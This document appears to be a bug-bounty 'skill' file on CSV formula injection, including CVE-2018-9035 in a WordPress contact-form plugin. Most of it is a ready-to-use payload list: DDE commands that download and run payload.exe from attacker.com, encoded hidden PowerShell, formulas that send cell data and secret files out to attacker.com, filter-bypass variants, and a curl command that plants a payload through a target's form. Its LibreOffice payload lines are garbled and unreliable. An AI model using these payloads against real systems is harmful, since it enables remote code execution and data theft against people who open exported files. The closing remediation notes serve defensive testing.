---
name: "csv-injection"
version: "1.0"
category: "injection"
subcategory: "csv-injection"
phase: "exploitation"
tags: ["bug-bounty", "csv-injection", "formula-injection", "dde", "excel", "spreadsheet", "recon", "data-exfiltration", "wordpress", "cve-2018-9035", "injection", "phishing"]
tools: ["burp-suite", "curl", "excel", "libreoffice", "python3"]
follow_up_skills: ["information-disclosure-harvesting", "exploitation-chaining", "bug-bounty-reporting", "phishing"]
prerequisite_skills: ["recon-endpoint"]
description: "Bug bounty skill: csv injection - exploitation phase, injection category"
---

# CSV Injection (Formula Injection)

## Summary

CSV Injection (also known as Formula Injection) occurs when an application exports user-controllable data to CSV or Excel files without properly escaping cells that begin with spreadsheet formula characters (`=`, `+`, `-`, `@`). When the exported file is opened in spreadsheet software (Excel, LibreOffice Calc, Google Sheets), the formulas are executed, potentially leading to:

- **DDE (Dynamic Data Exchange) Remote Code Execution** — executing arbitrary commands on the victim's machine
- **Data Exfiltration** — exfiltrating other cells' data via `HYPERLINK` or DDE
- **Remote File Download** — fetching malicious payloads from attacker-controlled servers

## CVE-2018-9035

- **Plugin**: Contact Form 7 to Database Extension (WordPress)
- **Version**: 2.10.32 and possibly earlier
- **Vulnerable file**: `contact-form-7-to-database-extension/ExportToCsvUtf8.php:135`
- **Issue**: Prints values to CSV without checking for spreadsheet formula characters
- **Impact**: 400,000+ active installations, plugin discontinued

### POC Payloads

```
=cmd|'/C calc.exe'!Z0
=HYPERLINK("http://attacker.com/leak?="&A1&A2, "Click to load more data!")
```

## Key Concepts

- **Formula Characters**: `=`, `+`, `-`, `@` at the start of a cell trigger formula evaluation
- **DDE Protocol**: `=cmd|' /C command'!Z0` — executes shell commands when the CSV is opened in Excel (Patched in Excel 2019+ with warnings but still works in many configurations)
- **HYPERLINK Exfiltration**: `=HYPERLINK("http://attacker.com/?data="&A1, "Click")` — sends cell data to attacker on click
- **Payload Encoding**: Excel supports various encodings to bypass filters, including `=`, `+`, `-`, `@` and their combinations
- **Google Sheets**: Supports `=IMPORTXML`, `=IMPORTFEED`, `=QUERY` etc. for data exfiltration
- **LibreOffice Calc**: Similar behavior to Excel, may execute DDE
- **CSV Context**: Unlike XSS in HTML, CSV injection targets spreadsheet parsers rather than browsers

## Technical Details

### How CSV Injection Works

1. An attacker submits input containing a spreadsheet formula into a form field (e.g., contact form, comment, profile field)
2. The application stores the input in a database
3. An administrator or user exports the data to CSV/Excel format
4. The formula is written directly into the CSV cell without escaping
5. When the CSV is opened in a spreadsheet application, the formula executes

### Formula Characters to Test

```
=
+
-
@
```

### Payload Categories

**DDE (Remote Code Execution):**
```
=cmd|'/C calc.exe'!Z0
=cmd|'/C powershell -e <base64>'!Z0
=cmd|'/C curl http://attacker.com/payload.exe -o payload.exe && payload.exe'!Z0
=cmd|'/C whoami > C:\users\public\output.txt'!Z0
```

**Data Exfiltration via HYPERLINK:**
```
=HYPERLINK("http://attacker.com/steal?data="&B1, "Click here")
=HYPERLINK(CONCATENATE("http://attacker.com/?", A1, B1, C1), "Details")
=HYPERLINK("http://attacker.com/exfil?"&A1,"Link")
```

**Data Exfiltration via DDE:**
```
=cmd|'/C curl http://attacker.com/$(whoami)'!Z0
=cmd|'/C nslookup $(cat /etc/passwd).attacker.com'!Z0
```

**Google Sheets Exfiltration:**
```
=IMPORTXML(CONCAT("http://attacker.com/leak?",A1), "//a")
=IMPORTFEED("http://attacker.com/leak?"&A1)
```

**Excel Formula Functions:**
```
=SUM(A1:A10)
=CONCATENATE(A1, ":", B1)
=IF(ISERROR(A1), "", A1)
```

## Methodology

### 1. Identify Entry Points

Find places where user input is logged and later exported:
- Contact forms
- Registration forms
- Survey responses
- Order details
- Support tickets
- Any form with "export to CSV/Excel" functionality

### 2. Test Formula Injection

Submit payloads starting with formula characters:
```
=1+1
=SUM(1+1)
=cmd|'/C calc.exe'!Z0
=HYPERLINK("http://YOUR-SERVER.com/test", "click")
```

### 3. Export and Verify

- Export the data as CSV
- Open in spreadsheet application
- Check if formulas execute (calc opens, server receives callback)

### 4. Escalate Impact

- Try to exfiltrate other cells containing sensitive data (passwords, tokens, PII)
- Attempt RCE via DDE
- Combine with other vulnerabilities (e.g., stored XSS in exported HTML)

## Detection

```bash
# Check if target uses vulnerable plugins
curl -s "https://target.com/wp-content/plugins/contact-form-7-to-database-extension/readme.txt" | head -20

# Test formula injection via form submission
curl -X POST "https://target.com/wp-json/contact-form-7/v1/contact-forms/1/feedback" \
  -d 'your-name=Test&your-email=test@test.com&=cmd|'"'"'/C curl http://attacker.com/exfil'"'"'!Z0'

# Look for CSV export endpoints
curl -s "https://target.com/wp-admin/admin.php?page=cfdb-export&form=my-form"
```

## Exploitation Payloads

### Basic Formula Test
```
=1+1
=2*3
=A1
```

### DDE Command Execution
```
=cmd|'/C calc.exe'!Z0
=cmd|'/C powershell -NoP -NonI -W Hidden -Exec Bypass -Enc <base64>'!Z0
=cmd|'/C bitsadmin /transfer job /download /priority high http://attacker.com/payload.exe C:\temp\payload.exe'!Z0
=cmd|'/C certutil -urlcache -f http://attacker.com/payload.exe payload.exe'!Z0
```

### Data Exfiltration
```
=HYPERLINK("http://attacker.com/?data="&B2,"Click")
=HYPERLINK(CONCATENATE("http://attacker.com/?",A1,"&",B1),"Link")
=cmd|'/C curl http://attacker.com/exfil?data=$(type C:\secret.txt)'!Z0
=cmd|'/C powershell -Command "$wc=New-Object System.Net.WebClient;$wc.DownloadString('http://attacker.com/?data='+[System.Environment]::UserName)"'!Z0
```

### Trigger on Open (No Click Required)
- DDE execution happens when Excel processes the formula on file open (unless protected view blocks it)
- `=cmd|'/C ...'!Z0` triggers without user interaction in vulnerable Excel versions

### LibreOffice Calc
```
=Y nuestro querido sistema llama a: cmd /C calc.exe
=Z nuestro querido sistema llama a: cmd /C calc.exe
```

## Bypass Techniques

### WAF / Input Filtering Bypass
```
'=cmd|'/C calc.exe'!Z0
"=cmd|'/C calc.exe'!Z0
	=cmd|'/C calc.exe'!Z0
+=cmd|'/C calc.exe'!Z0
```

### Character Encoding in Excel
```
=CMD|'/C calc.exe'!Z0
=cmd|'/c calc.exe'!z0
```

### Office Protection Bypass
- Excel 2019+ blocks DDE by default but shows a warning message
- Users may click "Enable" to allow execution
- Social engineering to convince the victim to enable content

## Tools

### Manual Testing
- **Burp Suite** — Intercept and modify form submissions
- **curl** — Send payloads to form endpoints

### Payload Generation
- **Python** — Generate DDE payloads with custom commands
- **Metasploit** — `exploit/multi/fileformat/office_dde_delivery`

### Callback Capture
- **Burp Collaborator**
- **Webhook.site** — https://webhook.site
- **Interact.sh** — OOB detection
- **Custom server** — Simple HTTP server to capture exfiltration callbacks

## Remediation

- Escape cells starting with `=`, `+`, `-`, `@` by prefixing with a single quote (`'=`)
- Use Excel XML format (`.xlsx`) instead of CSV for proper type handling
- Encode formula characters: replace `=` with `'=`, `+` with `'+`, `-` with `'-`, `@` with `'@`
- Warn users before opening exported CSV files
- Sanitize all user input before writing to exports
